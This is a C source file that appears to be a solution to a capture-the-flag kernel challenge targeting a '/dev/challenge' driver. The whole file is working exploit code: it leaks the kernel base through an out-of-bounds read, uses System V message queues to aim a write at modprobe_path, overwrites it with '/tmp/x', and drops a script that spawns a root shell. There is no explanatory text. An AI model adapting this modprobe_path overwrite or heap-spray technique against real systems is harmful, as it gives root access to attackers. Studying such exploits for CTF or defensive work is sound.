// musl-gcc exp.c -o exp -static
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#define ull unsigned long long
#define evil_str "/tmp/x\x00"

#define KCREATE         0x13370001U
#define KWRITE          0x13370002U
#define KREAD           0x13370003U
#define KFREE           0x13370004U

int fd, fd2;
unsigned long user_cs, user_ss, user_rflags, user_sp;

struct service_t {
    long idx;
    void *idk_ptr;
    long sz;
    void *usr_ptr;
};
struct service_t svc;


void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int qid[0x100];

void send_msg(int qid, int size, char *buf)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = 1;
    memcpy(msg.mtext, buf, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1)
    {
        perror("msgsnd");
        exit(1);
    }
}

void *recv_msg(int qid, size_t size)
{
    void *memdump = malloc(size);

    if (msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_NOERROR) == -1)
    {
        perror("msgrcv");
        return NULL;
    }

    return memdump;
}

void get_shell(void)
{
    puts("[*] Returned to userland, setting up for fake modprobe");
    system("echo '#!/bin/sh\nsetsid cttyhack setuidgid root sh' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Trigger shell with root priviledge");
    system("/tmp/sh");
}

long kbase=0;
#define STATIC_KERNEL_BASE 0xffffffff81000000
#define modprobe_path (0xffffffff82850ce0-STATIC_KERNEL_BASE) + kbase
#define commit_creds (0xffffffff81092c60-STATIC_KERNEL_BASE) + kbase
#define prepare_kernel_cred (0xffffffff81092f00-STATIC_KERNEL_BASE) + kbase

int main(int argc, char * argv[]){
    save_state();

    fd = open("/dev/challenge", O_RDWR);
    printf("[!] Opened fd : %d\n", fd);

    close(open("/dev/ptmx", O_RDONLY | O_NOCTTY));
    

    long buf[0x300];
    svc.idx = 0;
    ioctl(fd, KCREATE, &svc);

    svc.idx = 0;
    svc.sz = 0x2f8;
    svc.usr_ptr = (long)&buf;
    ioctl(fd, KREAD, &svc);

    kbase = buf[72] - 0x502190;
    printf("kbase : 0x%llx\n", kbase);

    for(int i = 0; i < 100; i++)
        printf("%i 0x%llx\n", i, buf[i]);

    sleep(1);

    long j=0;
    long payload[0x100];
    // emps + 0x30
    payload[j++] = modprobe_path-8; // emps[6]

    if ((qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("msgget");
        exit(1);
    }

    send_msg(qid[0], 0x80, &payload);
    recv_msg(qid[0], 0x80);

    fd2 = open("/dev/challenge", O_RDWR);
    printf("[!] Opened fd2 : %d\n", fd2);

    // overwrite modprobe_path by accessing emps[6]
    svc.idx = 6;
    svc.sz = strlen(evil_str)+1;
    svc.usr_ptr = (long)&evil_str;
    ioctl(fd, KWRITE, &svc);

    get_shell();
}
